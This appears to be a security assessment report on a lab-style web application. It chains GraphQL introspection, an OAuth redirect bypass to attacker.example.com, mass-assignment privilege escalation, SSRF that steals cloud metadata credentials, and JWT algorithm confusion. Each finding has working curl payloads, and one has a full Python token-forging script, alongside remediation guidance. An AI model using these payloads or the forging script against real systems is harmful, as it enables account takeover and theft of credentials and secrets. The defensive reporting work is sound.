# Technical Assessment Report

## Assessment Environment

### Target Infrastructure Summary

The target environment consists of a containerized microservices architecture hosting an enterprise cloud application. The following components were identified during the reconnaissance phase:

| Component | Technology | Purpose |
|-----------|------------|---------|
| Web Application | Node.js + Express.js | Primary API server and application backend |
| Authentication Service | Express.js (separate instance) | OAuth 2.0 provider and JWKS endpoint |
| GraphQL Endpoint | Apollo Server | Data query and mutation interface |
| REST API | Custom Express Router (v2) | Supplementary API endpoints |
| Document Generator | Headless Chromium (Puppeteer) | Server-side PDF rendering |
| Secrets Vault | HashiCorp Vault | Internal secrets management |
| Metadata Service | AWS-compatible | Cloud instance metadata (169.254.169.254) |

---

## Finding V-01: GraphQL Introspection Enabled in Production

**Severity:** High  
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
**OWASP Category:** API2:2023 - Broken Authentication (Information Leakage component)  
**CVSS v3.1 Score:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

### Description

The production GraphQL endpoint has introspection queries enabled, allowing unauthenticated clients to enumerate the complete API schema. This exposes all available data types, query fields, mutation operations, and their respective parameters. Critically, the schema revealed a `debugInfo` query containing sensitive internal information that was accessible without authentication.

### Technical Details

The GraphQL endpoint was discovered through automated directory enumeration. A request with an empty body returned a distinctive GraphQL error message confirming the endpoint's existence:

```http
POST /api/graphql HTTP/1.1
Host: target-app.local
Content-Type: application/json

{}
```

**Response:**

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{
  "errors": [
    {
      "message": "Query is required"
    }
  ]
}
```

The standard GraphQL introspection query was used to enumerate the complete schema:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
```

### Schema Analysis

The introspection query revealed the following concerning types and queries:

**Exposed Sensitive Type:**
```json
{
  "name": "DebugInfo",
  "fields": [
    {"name": "buildVersion"},
    {"name": "environment"},
    {"name": "recon_token"},        // OAuth initialization token
    {"name": "internalEndpoints"}   // Internal service discovery
  ]
}
```

The debugInfo query was accessible without authentication, exposing critical internal information:

```graphql
query {
  debugInfo {
    buildVersion
    environment
    recon_token
    internalEndpoints
  }
}
```

**Response contained:**

- Internal OAuth initialization token: A valid JWT with purpose `oauth_init`
- Internal service endpoints: Including the vault service address and cloud metadata endpoint
- Environment details: Build version and deployment environment information

### Impact

- **API Blueprint Exposure:** Complete schema enumeration provides an attacker with a detailed map of all available data and operations, significantly reducing reconnaissance effort.

- **Sensitive Token Leakage:** The exposed recon_token is a valid JWT intended for OAuth 2.0 flow initialization. This token should never be exposed to unauthenticated clients.

- **Internal Network Discovery:** The internalEndpoints field revealed internal service hostnames and IP addresses, providing an attacker with a roadmap for internal network targeting.

- **Information for Chained Attacks:** The token and internal endpoints discovered here were essential for executing subsequent stages of the attack chain (Findings V-02 through V-05).

### Evidence

```bash
# Discovery of GraphQL endpoint
curl -s -o /dev/null -w "%{http_code}" http://target-app.local/api/graphql
400

# Unauthenticated schema introspection
$ curl -s http://target-app.local/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' \
  | jq '.data.__schema.types[].name'

# Retrieval of sensitive debug information
$ curl -s http://target-app.local/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{debugInfo{buildVersion,environment,recon_token,internalEndpoints}}"}'
```

### Remediation

- **Immediate:** Disable GraphQL introspection in production environments. For Apollo Server, set introspection: false in the server configuration.

- **Short-term:** Implement authentication requirements on ALL queries, including debugInfo. No query should return sensitive data without proper authentication.

- **Long-term:** Implement query complexity analysis and depth limiting to prevent schema enumeration even if introspection is accidentally enabled.

## Finding V-02: OAuth redirect_uri Validation via startsWith() Permissive Matching

**Severity:** Medium
**CWE:** CWE-183 (Permissive List of Allowed Inputs)
**OWASP Category:** API8:2023 - Security Misconfiguration
**CVSS v3.1 Score:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

### Description

The OAuth 2.0 authorization endpoint validates the redirect_uri parameter using JavaScript's startsWith() string method rather than exact string comparison. This allows an attacker to provide a malicious redirect URI that begins with the expected legitimate prefix, bypassing the validation check.

### Technical Details

The OAuth authorization endpoint was discovered during endpoint enumeration:

```bash
$ curl http://target-app.local/oauth/authorize
{"error":"invalid_request","error_description":"Missing required parameters: client_id, redirect_uri, response_type=code"}
```

The client_id value was extracted from the frontend application bundle:

```javascript
// From: app.bundle.js
const CLIENT_ID = "app-client-production";
```
Testing revealed the validation logic uses startsWith() rather than exact matching:

```javascript
// Vulnerability pattern (server-side logic)
const VALID_REDIRECT = "https://app.target-app.local/callback";

function validateRedirectUri(uri) {
    // INSECURE: Uses startsWith instead of exact comparison
    return uri.startsWith(VALID_REDIRECT);
}

// This bypasses validation:
// "https://app.target-app.local/callback.attacker.com" ← starts with valid prefix
```

### Exploitation

The bypass was achieved by prepending the valid prefix to an attacker-controlled URI:

```bash
# Craft the bypass redirect URI
# The valid prefix is: https://app.target-app.local/callback
# The bypass prepends this to a fragment or subdomain

$ REDIRECT_URI="https://app.target-app.local/callback%23@attacker.example.com/callback"

# Initiate authorization flow with bypassed redirect
$ curl -v "http://target-app.local/oauth/authorize?\
client_id=app-client-production&\
redirect_uri=${REDIRECT_URI}&\
response_type=code&\
scope=openid%20profile&\
state=prevent-csrf"
```

The server responded with a redirect containing an authorization code, confirming the bypass succeeded.

The authorization code was then exchanged for an access token:

```bash
$ curl -s -X POST http://target-app.local/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code\
&code=${AUTH_CODE}\
&redirect_uri=${REDIRECT_URI}\
&client_id=app-client-production"
```

**Response:**

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIs...[REDACTED]",
  "token_type": "Bearer",
  "expires_in": 28800,
  "scope": "openid profile"
}
```

The resulting access token provided authentication as a low-privileged employee role user.

### Impact

- **Authorization Code Interception:** An attacker could redirect the authorization code to their own server by prepending the valid prefix to their domain.

- **Session Token Acquisition:** Successful exploitation provides a valid, albeit low-privileged, session token—the first step toward privilege escalation.

- **OAuth Flow Subversion:** This bypass undermines the fundamental security property of the authorization code grant, which relies on redirect URI validation to prevent code interception.

### Remediation

- **Immediate:** Replace startsWith() logic with exact string comparison using === or equivalent.

- **Short-term:** Implement a server-side allowlist of registered redirect URIs and validate against this list with exact matching.

- **Long-term:** Implement PKCE (Proof Key for Code Exchange) extension to provide defense-in-depth, protecting against authorization code interception even if redirect validation is bypassed.

## Finding V-03: Mass Assignment in User Profile API Endpoint

- **Severity:** Critical
- **CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **OWASP Category:** API3:2023 - Broken Object Property Level Authorization
- **CVSS v3.1 Score:** 9.8 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

### Description

The REST API endpoint PUT /api/v2/users/me accepts a JSON body and directly maps all provided fields to the user object in the database without field-level filtering. This allows an authenticated user (of any privilege level) to modify sensitive attributes including role and permissions, effectively granting themselves administrative access.

### Technical Details

The vulnerable endpoint was discovered through analysis of the frontend application JavaScript bundle:

```javascript
// From: app.bundle.js
fetch("/api/v2/users/me", {
    method: "PUT",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(profileData)
})
```

The server-side implementation exhibited the mass assignment pattern:

```javascript
// Vulnerable pattern (server-side reconstruction)
app.put('/api/v2/users/me', authenticate, async (req, res) => {
    const userId = req.user.id;
    const updates = req.body;  // ← All body fields accepted without filtering
    
    // INSECURE: Direct assignment of all provided fields
    const updatedUser = await db.users.update(userId, updates);
    
    res.json({ success: true, user: updatedUser });
});
```

### Exploitation

With a valid low-privileged session token, an attacker can inject the role and permissions fields into the profile update request:

```bash
# Mass assignment attack payload
$ curl -s -X PUT http://target-app.local/api/v2/users/me \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -d '{
    "role": "admin",
    "permissions": ["read", "write", "admin"]
  }'
```

**Response:**

```json
{
  "success": true,
  "user": {
    "id": "1003",
    "email": "analyst@target-app.local",
    "displayName": "Alex Analyst",
    "role": "admin",
    "permissions": ["read", "write", "admin"]
  }
}
```

Further escalation to the super-admin role was possible by identifying this role through source code analysis:

```bash
# Escalation to super-admin role
$ curl -s -X PUT http://target-app.local/api/v2/users/me \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -d '{
    "role": "super-admin",
    "permissions": ["read", "write", "admin", "super"]
  }'
```

### Verification

```bash
$ curl -s http://target-app.local/api/v2/users/me \
  -H "Authorization: Bearer ${ACCESS_TOKEN}"
```

```json
{
  "user": {
    "id": "1003",
    "email": "analyst@target-app.local",
    "displayName": "Alex Analyst",
    "role": "super-admin",
    "permissions": ["read", "write", "admin", "super"]
  }
}
```

### Impact

- **Complete Authorization Bypass:** Any authenticated user can become a super-administrator, completely bypassing role-based access controls.

- **Privilege Escalation Chain:** This vulnerability is a critical link in the attack chain, providing the elevated privileges necessary to access administrative features (Findings V-04 and V-05).

- **Data Exposure:** Administrative access enables viewing and modification of all user data and application configurations.

- **Persistence:** Attackers can modify permissions of other accounts or create new administrative accounts for persistent access.

### Remediation

  - **Immediate:** Implement field-level allowlisting on the endpoint. Only explicitly permitted fields should be accepted:

```javascript
// Secure implementation
const ALLOWED_FIELDS = ['displayName', 'email', 'avatar'];

app.put('/api/v2/users/me', authenticate, async (req, res) => {
    const updates = {};
    for (const field of ALLOWED_FIELDS) {
        if (req.body[field] !== undefined) {
            updates[field] = req.body[field];
        }
    }
    const updatedUser = await db.users.update(req.user.id, updates);
    res.json({ success: true, user: updatedUser });
});
```

- **Short-term:** Implement role-based access control (RBAC) validation at the data access layer, rejecting writes to sensitive fields regardless of API-level filtering.

- **Long-term:** Adopt a Data Transfer Object (DTO) pattern with strict typing, ensuring only defined properties can be deserialized from client input.

## Finding V-04: Blind Server-Side Request Forgery via Document Generation

**Severity:** Critical
**CWE:** CWE-918 (Server-Side Request Forgery)
**OWASP Category:** API10:2023 - Unsafe Consumption of APIs
**CVSS v3.1 Score:** 9.1 (AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)

### Description

The administrative document generation feature accepts HTML templates that are rendered server-side using a headless Chromium browser (Puppeteer). JavaScript embedded in the template executes in the server context, enabling Server-Side Request Forgery (SSRF) to internal network resources, including the cloud instance metadata service at 169.254.169.254.

### Technical Details

The document generation endpoint was discovered through frontend bundle analysis:

```bash
$ curl -s http://target-app.local/assets/app.bundle.js \
  | grep -oP '/api/v2/reports/generate'
```

The endpoint accepts JSON with a template field containing HTML:

```json
{
  "template": "<html><body>Report Content</body></html>"
}
```

The HTML template is rendered server-side, and any JavaScript executes within the Puppeteer context with network access to internal resources.

### Exploitation

An SSRF payload was crafted to access the cloud metadata service:

```bash
$ curl -s -X POST http://target-app.local/api/v2/reports/generate \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -d '{
    "template": "<script>fetch(\"http://169.254.169.254/latest/meta-data/\").then(r=>r.text()).then(t=>document.write(\"<pre>\"+t+\"</pre>\"))</script>"
  }'
```

The server response included detailed logging of the SSRF request:

```json
{
  "success": true,
  "rendering_log": [
    {
      "event": "ssrf_request",
      "original_url": "http://169.254.169.254/latest/meta-data/",
      "status": 200,
      "body": "ami-id\nhostname\niam/\ninstance-id\ninstance-type\nlocal-ipv4\npublic-ipv4\nsecurity-groups"
    }
  ]
}
```

Subsequent requests targeted the IAM credentials path discovered through the initial enumeration:

```bash
$ curl -s -X POST http://target-app.local/api/v2/reports/generate \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -d '{
    "template": "<script>fetch(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role\").then(r=>r.text()).then(t=>document.write(\"<pre>\"+t+\"</pre>\"))</script>"
  }'
```

Response contained:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIAXXXXXXXXXXXXXX",
  "SecretAccessKey": "secret-access-key-value",
  "Token": "session-token-value",
  "Expiration": "2026-05-05T13:42:55Z",
  "JWKS_Endpoint": "https://auth.target-app.local/.well-known/jwks.json"
}
```

The internal vault service was also accessible:

```bash
$ curl -s -X POST http://target-app.local/api/v2/reports/generate \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${ACCESS_TOKEN}" \
  -d '{
    "template": "<script>fetch(\"http://internal-vault.target-app.local:8200/v1/sys/health\").then(r=>r.text()).then(t=>document.write(\"<pre>\"+t+\"</pre>\"))</script>"
  }'
```

```json
{
  "initialized": true,
  "sealed": false,
  "standby": false,
  "version": "Vault v1.15.2",
  "cluster_name": "app-vault-production"
}
```

### Impact

- **Cloud Credential Exposure:** The SSRF vulnerability enabled extraction of temporary cloud provider credentials with associated IAM role permissions.

- **Internal Service Access:** The attacker can interact with any internal HTTP service accessible from the application server, including databases, message queues, and monitoring systems.

- **Cryptographic Material Exposure:** The extracted JWKS endpoint URL and cloud credentials provided the cryptographic material necessary for the JWT algorithm confusion attack (Finding V-05).

- **Network Boundary Bypass:** The SSRF effectively bridges the gap between external access and the internal network, defeating network segmentation controls.

### Remediation

- **Immediate:** Implement server-side URL validation with a strict allowlist of permitted external resources. Block access to private IP ranges (RFC 1918) and the metadata service IP (169.254.169.254).

- **Short-term:** Disable JavaScript execution in the Puppeteer rendering context or use a sandboxed iframe with restricted permissions.

- **Medium-term:** Implement network-level egress filtering to block the application server from accessing internal services not required for its operation.

- **Long-term:** Migrate document generation to a client-side solution or a dedicated, isolated service with minimal network access.

## Finding V-05: JWT Algorithm Confusion Attack

**Severity:** Critical
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
**OWASP Category:** API2:2023 - Broken Authentication
**CVSS v3.1 Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

### Description

The authentication service trusts the alg header from incoming JWT tokens and, when presented with an HS256 (HMAC-SHA256) token, verifies the signature using the server's RSA public key as the HMAC shared secret. Since the public key is available through a JWKS endpoint, an attacker can forge valid HS256 tokens with arbitrary claims, including the super-admin role required for vault access.

### Technical Details

The JWKS (JSON Web Key Set) endpoint was discovered through credentials extracted during the SSRF attack (Finding V-04):

```bash
$ curl -s http://target-app.local/.well-known/jwks.json
```

```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "key_ops": ["verify"],
      "alg": "RS256",
      "kid": "app-production-key-1",
      "n": "1UsVKVSoRRczIvni_G-FcdrPnUJOnVJ6j-bq3a0RylGXBU-iZ_EejxsTQBn8DZ2fZWuXKqmI8rmaEunag6hz7AxVEjHCHbYxSFvwJlJKFoGn8CoYPuPiN8L3UBDxBXshJK7_GRPsWFhQICiY-Po8_539UvQktG5-FbGL1U6Xf7mrFeL_qwctYBB5VhShUhZ8bksEMGWobIZSEHdpjuKumDWElFuBUfekj5UpEMloyk6vgZwPf6QqUD0eTrGgh55FM8x0YODmesLGeGsRTmdX-zwiJf9AHiUwf64aM27CICIlcJUvZWTBlvZRarc7ShhS8VEjGwNvKz3XF-uA90RGrQ",
      "e": "AQAB",
      "x5c": ["LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K...[REDACTED]...LS0tLQo="]
    }
  ]
}
```

The vulnerability exists in how the server handles the JWT algorithm:

```javascript
// Vulnerable pattern (server-side JWT verification)
function verifyToken(token) {
    const decoded = jwt.decode(token, { complete: true });
    const algorithm = decoded.header.alg;  // ← Trusts client-supplied algorithm
    
    if (algorithm === 'RS256') {
        // Verify with RSA public key
        return jwt.verify(token, publicKey, { algorithms: ['RS256'] });
    } else if (algorithm === 'HS256') {
        // INSECURE: Uses RSA public key as HMAC secret
        return jwt.verify(token, publicKey, { algorithms: ['HS256'] });
    }
}
```

### Exploitation

The attack requires forging a JWT with:

- **Header:** alg: "HS256" (triggering symmetric verification path)

- **Payload: role:** "super-admin" (the required claim for vault access)

- **Signature:** HMAC-SHA256 computed using the RSA public key as the secret

Python-based JWT forgery script:

```python
import base64
import json
import hmac
import hashlib
import time

# Public key from JWKS endpoint (x5c certificate)
x5c = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0K...[REDACTED]"
cert_pem = base64.b64decode(x5c).decode()

# Create token header (HS256 triggers vulnerable code path)
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "app-production-key-1"
}

# Create payload with super-admin role claim
payload = {
    "role": "super-admin",
    "sub": "forged-admin",
    "iss": "https://auth.target-app.local",
    "aud": "app-production",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}

# Base64url encode header and payload
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).rstrip(b'=').decode()

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).rstrip(b'=').decode()

# Sign with HS256 using the public key certificate as HMAC secret
message = f"{header_b64}.{payload_b64}"
signature = hmac.new(
    cert_pem.encode(),
    message.encode(),
    hashlib.sha256
).digest()
signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

forged_token = f"{header_b64}.{payload_b64}.{signature_b64}"
print(forged_token)
```

### Verification

The forged token was used to access the protected vault endpoint:

```bash
$ curl -s http://target-app.local/api/vault/critical-secrets \
  -H "Authorization: Bearer ${FORGED_TOKEN}"
```

Response:

```json
{
  "vault_access": "GRANTED",
  "algorithm_used": "HS256 (algorithm confusion attack successful)",
  "critical_secrets": {
    "database_master": "postgresql://vault_admin:password@db.internal:5432/production",
    "aws_root_key": "AKIAXXXXXXXXXXXXXX",
    "aws_root_secret": "root-secret-key-value",
    "internal_api_signing_key": "internal-signing-key-2024"
  }
}
```

### Impact

    - **Complete Authentication Bypass:** Any JWT can be forged with arbitrary claims, bypassing the entire authentication system.

    - **Vault Compromise:** All secrets stored in the internal vault are exposed, including database credentials, cloud access keys, and API signing keys.

    - **Systemic Trust Undermining:** All systems relying on JWT-based authentication are compromised, as tokens for any user can be created at will.

- **Persistence Capability:** An attacker with database credentials and API keys can establish persistent access through multiple independent vectors.

### Remediation

- **Immediate:** Remove the ability to use HMAC algorithms for JWT verification. Explicitly restrict accepted algorithms to asymmetric algorithms only:

```javascript
// Secure implementation
function verifyToken(token) {
    // Only accept RS256 - ignore alg header
    return jwt.verify(token, publicKey, { 
        algorithms: ['RS256']  // Explicit algorithm restriction
    });
}
```

- **Short-term:** Separate key management so that the RSA public key cannot be confused with an HMAC secret.

- **Long-term:** Implement OpenID Connect with a well-tested identity provider, reducing custom JWT handling code.

## Additional Observations

### Informational Finding I-01: Technology Stack Disclosure

The application discloses its technology stack through HTTP response headers:

```http
X-Powered-By: Express
```

**Recommendation:** Remove or obfuscate this header in production environments to increase attacker effort during reconnaissance.

### Informational Finding I-02: Overly Permissive CORS Configuration

The application implements a wildcard CORS policy:

```http
Access-Control-Allow-Origin: *
```

**Recommendation:** Restrict CORS to explicitly trusted origins rather than using wildcards.

This technical assessment was produced as part of an authorized security engagement. All findings have been verified and reproduction steps confirmed.
```
